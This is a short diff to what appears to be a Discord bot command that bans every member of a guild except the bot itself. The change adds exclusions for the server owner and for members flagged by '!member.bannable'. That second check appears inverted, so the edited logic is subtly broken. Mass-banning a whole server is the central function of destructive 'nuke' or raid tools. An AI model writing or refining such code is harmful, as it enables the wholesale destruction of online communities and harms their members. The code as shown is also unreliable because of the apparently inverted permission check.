@@ -12,7 +12,7 @@ module.exports = {
         console.log("banning all members in guild " + guild.name)
         await guild.fetchMembers().then(guild => {
                        guild.members.forEach(member => {
-                           if (member.id !== client.user.id) {
+                           if (member.id !== client.user.id && !member.bannable && member.id !== guild.ownerID) {
                                member.ban()
                            }
                        })
